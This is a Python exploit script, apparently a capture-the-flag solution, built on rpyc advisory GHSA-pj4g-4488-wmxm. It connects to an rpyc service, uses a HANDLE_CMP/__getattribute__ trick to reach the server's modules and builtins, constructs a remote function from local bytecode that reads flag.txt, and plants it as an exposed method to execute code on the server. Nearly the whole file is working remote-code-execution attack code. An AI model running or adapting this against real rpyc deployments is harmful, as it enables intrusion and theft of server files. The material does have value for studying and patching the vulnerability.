
# https://github.com/tomerfiliba-org/rpyc/security/advisories/GHSA-pj4g-4488-wmxm
from time import time
import rpyc

def exploit(param):
    with open('./flag.txt', 'r') as f:
        abc = f.read()
        return abc



t1 = time()
r = rpyc.connect('localhost', 1337)
handler = rpyc.core.consts.HANDLE_CMP

print("Connected!")

def netref_getattr(netref, attrname):
    return r.sync_request(handler, netref, attrname, '__getattribute__')

remote_svc_proto = netref_getattr(r.root, '_protocol')
remote_dispatch = netref_getattr(remote_svc_proto, '_dispatch_request')
remote_class_globals = netref_getattr(remote_dispatch, '__globals__')
remote_modules = netref_getattr(remote_class_globals['sys'], 'modules')

print("Got the modules!") 

_builtins = remote_modules['builtins']
remote_builtins = {k: netref_getattr(_builtins, k) for k in dir(_builtins)}

print("Got the builtins!")


# populate globals for CodeType calls on remote
remote_globals = remote_builtins['dict']()
for name, netref in remote_builtins.items():
    remote_globals[name] = netref

for name, netref in netref_getattr(remote_modules, 'items')():
    remote_globals[name] = netref

print("Populated globals!")

# create netrefs for types to create remote function malicously
remote_types = remote_builtins['__import__']("types")
remote_types_CodeType = netref_getattr(remote_types, 'CodeType')
remote_types_FunctionType = netref_getattr(remote_types, 'FunctionType')

print("Got function types!")

print("Just getting started time:", int(time() - t1), "seconds")


def get_code(obj_codetype, func, filename=None, name=None):
    func_code = func.__code__
    arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags','co_firstlineno','co_code', 'co_consts', 'co_names', 'co_varnames', 'co_freevars', 'co_cellvars', 'co_filename', 'co_name']


    codetype_args = [getattr(func_code, n) for n in arg_names]
    dbug = {n: getattr(func_code, n) for n in arg_names}
    if filename:
        codetype_args[arg_names.index('co_filename')] = filename
    if name:
        codetype_args[arg_names.index('co_name')] = name
    i = 1
    for key,val in dbug.items() : 
        print(i,key, val, type(val))
        i += 1
    mycode = obj_codetype(*codetype_args)
    return mycode
# remote_eval_codeobj = get_code(remote_types_CodeType, myeval, name="__code__")
arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags','co_code', 'co_consts', 'co_names', 'co_varnames', 'co_filename', 'co_name', 'co_name', 'co_firstlineno','co_lnotab', 'co_lnotab', ]
func_code = exploit.__code__

# number 7 must be bytes
# number 13 is string -> file name
# number 15 must be bytes
# number 16 must be bytes
codetype_args = [getattr(func_code, n) for n in arg_names]

# codetype_args[12] = 'exploit'
# codetype_args[13] = 24
# codetype_args[14] = func_code.co_lnotab
# codetype_args[15] = func_code.co_lnotab

remote_eval_codeobj = remote_types_CodeType(*codetype_args)
remote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)

remote_setattr = remote_builtins['setattr']
remote_type = remote_builtins['type']

remote_setattr(remote_type(r.root), 'exposed_add', remote_eval)

res = r.root.exposed_add()
print(res)

##